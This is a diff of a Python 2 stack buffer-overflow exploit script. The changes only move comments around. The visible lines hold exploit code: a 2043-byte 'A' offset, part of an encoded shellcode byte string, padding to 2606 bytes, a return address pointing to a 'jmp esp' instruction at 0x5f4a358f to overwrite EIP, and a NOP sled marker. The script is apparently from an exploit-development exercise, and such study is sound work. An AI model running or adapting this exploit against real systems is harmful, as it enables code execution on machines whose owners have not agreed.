@@ -1,8 +1,6 @@
 #!/usr/bin/env python2
 import socket
 
-#  0x5f4a358f : "\xFF\xE4" (jmp ESP)
-
 #offset A's in ESP dump
 string = "A" * 2043
 
@@ -38,8 +36,7 @@ string += ("\xbf\x04\xb7\x39\x3f\xd9\xca\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
 #Padding
 string += "A" * (2606-len(string))
 
-#  0x5f4a358f 
-#String for EIP position that points to command "jmp esp" ("\xFF\xE4"). 
+#String for EIP position that points to command "jmp esp" ("\xFF\xE4") 0x5f4a358f 
 string += "\x8F\x35\x4A\x5F"
 
 #NOP sled
